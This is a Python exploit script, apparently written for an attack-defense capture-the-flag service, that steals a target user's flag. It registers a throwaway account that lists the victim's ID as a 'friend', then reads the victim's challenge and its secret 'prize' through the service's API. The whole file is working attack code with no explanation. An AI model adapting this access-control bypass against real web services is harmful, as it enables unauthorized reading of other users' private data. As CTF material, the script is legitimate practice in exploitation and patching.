import sys
import requests
import string
import random
from utils import *

def exploit(ip, flag_id):
    s = requests.Session()
    username = random_string()
    password = random_string()

    friends = [flag_id]
    s.post(f"http://{ip}:4960/api/register", json={"name": username, "password": password, "friends": friends})

    r = s.get(f"http://{ip}:4960/api/challenges/{flag_id}")

    

    if r.status_code != 200:
        print(r.text)
        return None
    
    j = r.json()

    print(j)

    id = j['challenges'][0]["_id"]
    
    r = s.get(f"http://{ip}:4960/api/question/{id}")
    
    flag = r.json()['prize']
    return flag

if __name__ == "__main__":
    ip = sys.argv[1]
    flag_id = sys.argv[2]
    print(exploit(ip, flag_id))